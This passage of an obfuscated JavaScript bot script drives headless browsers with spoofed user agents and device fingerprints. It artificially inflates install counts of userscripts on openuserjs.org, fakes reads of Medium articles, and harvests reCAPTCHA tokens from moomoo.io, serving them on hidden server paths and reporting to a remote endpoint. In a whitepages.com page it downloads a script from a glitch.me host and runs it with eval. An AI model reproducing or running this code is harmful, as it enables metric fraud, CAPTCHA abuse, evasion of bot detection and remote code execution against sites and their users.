      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': a1(0x10) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + a1(0x20) + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + a0(0x21) + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + a0(0x0),
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + a0(0x14) + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    Z(0xe, 'FINV') + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + a1(0xf) + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + a1(0x1d) + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0xb * -0x22e + 0x2ec + 0x150e
  };

function a() {
  const bo = [
    'Awr1lMnVBs8',
    'wmonDZDIWQ4LnZRcGq',
    'CMf0Dw1ZlMLVlW',
    'zwf0Aw5Nigf1Da',
    'map',
    'uJeDemoKWPu6gbWN',
    'evaluate',
    'g8oNAtD0W6K6kq',
    'AMfjmYdcOSo4ya',
    'abcdef',
    'W5ZdTmoBW4TLWRZdGL54uG',
    'zg9zva',
    'CMCVzw4VC2nYAq',
    'wKyXngLZC0Pgrq',
    'bmkvAColqxOlqCkhEq',
    'tips-1c4cb',
    'https://gr',
    'uxzotKnrltHsCa',
    'WRtdUtFdJLr0f0GAW7O',
    'ast,mrbeas',
    'lxvZAw5NlwrHBG',
    'childNodes',
    'querySelec',
    'lwL4ne9PEMTbBG',
    'W6XwWRbTWRRcNSo/cWBdLG',
    'mpaign=soc',
    'nmoff8kwWP5zWPtcRSkgW4e',
    'W60XBSkSzmksgtJcVw8',
    'ujiBqXnn92',
    'inally-met',
    'BxjIzwfZDcXTCG',
    'okie-prefe',
    'e/moomoo.i',
    'oYbtts1ootyWvq',
    'hcBcMSkuW64ZWRJdOW1G'
  ];
  a = function() {
    return bo;
  };
  return a();
}
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const a2 = c;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x408 + -0xb * -0x93 + -0x249)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags[a2(0xb)] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x1854 + -0x1c5 * 0x16 + 0x1fd3 * 0x2), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x14 * -0x31 + -0x1bd7 + 0x1867), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x204b + -0x6a4 + 0x1 * -0x19a7;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x12b7 + -0x1 * 0x19ea + 0x2ca1; w < getRandomInt(0x1c9c + -0x4 * 0x192 + -0x771 * 0x3, -0xd37 + -0x2483 + 0x31bf * 0x1); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x1739b + -0x3184 * 0x4 + -0x219 * -0x1d);
        }
      }();
    }, 0xc4c + -0x1 * -0x38f + -0xf77), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        const a3 = c;
        axios['post']('https://st' + a3(0x2) + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0xa7 * -0x3a + -0x4e7 * 0x6 + -0x86c;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x11d7 + -0xb15 + -0x6c2, 0x2 * -0xa7f + 0xbe6 + -0x3a * -0x29)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x5c07 + 0x5f36 + -0x460d);
    }, -0x1eb + 0x2 * 0x3be + -0x52d), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x6 * 0xe1 + 0xa78 + 0xe * -0x5f;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0xc3f + 0xa7c + 0xcb * 0x11), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0xf07 + -0x1 * -0x1843 + -0x93c), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x13d2e7 + 0x18dc19 + 0x8b26e);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x78b * -0x3 + -0x1181 * -0x1 + -0x4 * -0x161);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x6bb * -0x4 + 0x1 * -0x185f + -0x1c5);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x2696 + 0x1b55 * 0x1 + 0x1 * 0x2ad1);
}
doFlags['doOUJS'] && ((async () => {
  async function f() {
    const a4 = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + a4(0x7, 'OcO)'),
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x1a6d + 0x2418 + -0x9aa) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0xe08 + 0x2ea * 0x1 + -0x1 * 0x10f1));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x24c8 + 0x1f15 + 0x1 * 0x5b3, D['indexOf']('\x20'));
        return B ? E['slice'](-0x25e0 * -0x1 + 0x1 * -0x212f + -0x4b1, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x2f08 + 0x2cd * 0x16 + -0x4596),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x27bb + 0x3 * 0x727 + 0x52 * 0xb3),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x2 * -0x197 + 0x83 * -0x22 + 0x1494; k < 0xe5d * 0x1 + 0x2259 + -0x30b2; k++)
    setTimeout(f, (0x1bee0 + 0x53 + -0xd4d3) * k * getRandomInt(-0x21aa + -0x17b * 0x13 + 0x3dcc, -0x58c + -0xaa8 + 0x1037));
  setInterval(() => {
    f();
    for (let l = -0x13af * 0x1 + -0x1ad7 + -0x1743 * -0x2; l < -0x529 * 0x4 + -0x1 * -0x219d + -0xcf5 * 0x1; l++)
      setTimeout(f, (0x1f44 * 0xd + 0x2bd * 0x49 + 0x125 * -0x145) * l * getRandomInt(0x190e + 0x23d0 + 0x3cdd * -0x1, -0x3 * -0x85d + -0x1047 * 0x1 + 0x3 * -0x2ef));
  }, 0x317a59 + 0x85 * -0x1319 + -0x6 * -0x29006);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
